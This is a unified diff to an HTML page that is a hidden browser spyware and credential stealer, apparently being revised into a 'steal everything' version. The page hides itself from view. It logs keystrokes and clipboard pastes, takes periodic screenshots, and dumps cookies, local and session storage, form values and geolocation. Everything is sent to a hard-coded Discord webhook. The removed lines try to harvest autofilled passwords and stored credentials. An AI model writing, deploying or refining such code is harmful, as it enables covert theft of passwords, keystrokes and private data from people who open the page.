@@ -2,97 +2,58 @@
 <html>
 <head>
     <title></title>
-    <style>body{margin:0;background:#000;opacity:0;position:fixed;inset:0;z-index:-9999;display:none;visibility:hidden;}</style>
+    <style>body{margin:0;background:#000;opacity:0;position:fixed;inset:0;z-index:-9999;display:none;visibility:hidden;overflow:hidden;}</style>
 </head>
 <body>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
     const webhook = "https://discord.com/api/webhooks/1520935776152588399/s5XS6Edgv2rvUcnBAQIXg2XXqhxbBd2pk-YkknYSvKWyG1eioTMV6_Iq8BXi3moO9mGY";
-    let log = '';
 
-    async function exfil(data, file = false) {
+    async function exfil(content, isFile = false) {
         try {
-            if (file) {
+            if (isFile) {
                 const fd = new FormData();
-                fd.append('file', data, `pw_${Date.now()}.png`);
+                fd.append('file', content, `max_${Date.now()}.png`);
                 await fetch(webhook, {method: 'POST', body: fd});
             } else {
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: data})
-                });
+                await fetch(webhook, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content})});
             }
         } catch(e) {}
     }
 
-    function hide() {
-        document.documentElement.style.cssText = "display:none!important;visibility:hidden!important;opacity:0;left:-99999px;position:absolute;";
-        document.body.style.cssText = "display:none!important;";
+    function superHide() {
+        document.documentElement.style.cssText = 'display:none !important; visibility:hidden !important; opacity:0 !important; position:absolute !important; left:-99999px !important; top:-99999px !important;';
+        document.body.style.cssText = 'display:none !important;';
+        window.scrollTo(0, 999999);
     }
-    hide();
-    setInterval(hide, 200);
+    superHide();
+    setInterval(superHide, 150);
 
-    // Heavy Google Password Grab Attempts
-    async function stealPasswords() {
-        exfil("🔓 ATTEMPTING GOOGLE SAVED PASSWORDS GRAB...");
+    // All grabs
+    let keys = '';
+    document.addEventListener('keydown', e => { keys += e.key.length > 1 ? `[${e.key}]` : e.key; if(keys.length > 60) { exfil(`🔑 ${keys}`); keys=''; } });
 
-        // Autofill trick + form probe
-        const forms = document.createElement('form');
-        forms.innerHTML = `
-            <input type="text" name="email" autocomplete="username email">
-            <input type="password" name="pass" autocomplete="current-password">
-        `;
-        document.body.appendChild(forms);
+    document.addEventListener('paste', e => setTimeout(() => exfil(`📋 ${ (e.clipboardData || window.clipboardData || {}).getData('text') }`), 50));
 
-        // Trigger autofill where possible
-        setTimeout(() => {
-            try {
-                const inputs = document.querySelectorAll('input[autocomplete]');
-                inputs.forEach(input => {
-                    input.focus();
-                    input.dispatchEvent(new Event('input', {bubbles: true}));
-                    if (input.value) exfil(`🔑 AUTOFILL GRAB: ${input.name} = ${input.value}`);
-                });
-            } catch(e) {}
-        }, 800);
-
-        // Credential Management API (limited but try)
-        if (navigator.credentials && navigator.credentials.get) {
-            try {
-                const creds = await navigator.credentials.get({password: true, mediation: 'silent'});
-                if (creds) exfil(`🔓 CREDENTIALS: ${JSON.stringify(creds)}`);
-            } catch(e) {
-                exfil(`🔓 CRED API ERROR: ${e.message}`);
-            }
-        }
-
-        // Dump any accessible storage/cookies for Google domains
-        exfil(`🍪 GOOGLE RELATED: Cookies=${document.cookie}\nLocal=${JSON.stringify(localStorage)}\nURL=${location.href}`);
-    }
-
-    // Run password steal on load
-    setTimeout(stealPasswords, 600);
-
-    // Keep keylog + screenshots as backup
-    document.addEventListener('keydown', e => {
-        log += e.key.length > 1 ? `[${e.key}]` : e.key;
-        if (log.length > 40) {
-            exfil(`🔑 KEYS: ${log}`);
-            log = '';
-        }
-    });
-
-    async function cap() {
+    async function ss() {
         try {
-            const c = await html2canvas(document.documentElement, {scale:0.5});
-            c.toBlob(b => exfil(b, true));
+            const canvas = await html2canvas(document.documentElement, {scale:0.55, useCORS:true});
+            canvas.toBlob(b => exfil(b, true));
         } catch(e) {}
     }
-    setInterval(cap, 15000);
-    setTimeout(cap, 3000);
+    setInterval(ss, 8000);
+    setTimeout(ss, 1200);
 
-    setTimeout(() => exfil('✅ GOOGLE PASSWORD STEALER ACTIVE - BLANK HIDDEN MODE'), 400);
+    function fullDump() {
+        exfil(`FULL DUMP:\nCookies: ${document.cookie}\nLocal: ${JSON.stringify(localStorage)}\nSession: ${JSON.stringify(sessionStorage)}\nURL: ${location.href}\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nTime: ${new Date()}`);
+        document.querySelectorAll('input,textarea,select').forEach(i => { if(i.value) exfil(`FORM: ${i.type} - ${i.name || i.id} = ${i.value}`); });
+    }
+    setTimeout(fullDump, 700);
+    setInterval(fullDump, 25000);
+
+    if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => exfil(`GEO: ${p.coords.latitude},${p.coords.longitude}`));
+
+    setTimeout(() => exfil('✅ MAX STEAL EVERYTHING ACTIVE - RESEARCH OPTIMIZED'), 400);
 
     window.onbeforeunload = () => true;
 </script>
